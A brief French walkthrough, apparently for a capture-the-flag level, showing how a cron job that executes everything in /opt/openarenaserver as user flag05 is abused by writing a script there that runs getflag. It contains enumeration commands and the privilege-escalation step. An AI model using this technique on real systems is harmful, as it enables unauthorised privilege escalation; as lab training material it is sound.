```bash
$>find / -user flag05 -readable 2>/dev/null
/usr/sbin/openarenaserver
```
En listant ses droits on y a accés en lecture et en le lisant le fichier nous donne l'indication du doosier /opt/openarenaserver

Après verification on peux ecrire dans le dossier /opt/openarenaserver

Le fichier nous indique que tout les fichiers dans /opt/openarenaserver seront executer puis supprimer
```bash
$>find / -name level05 2>/dev/null
/var/mail/level05
```
```bash
cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

echo "getflag > /tmp/flag" > /opt/openarenaserver/gettoken
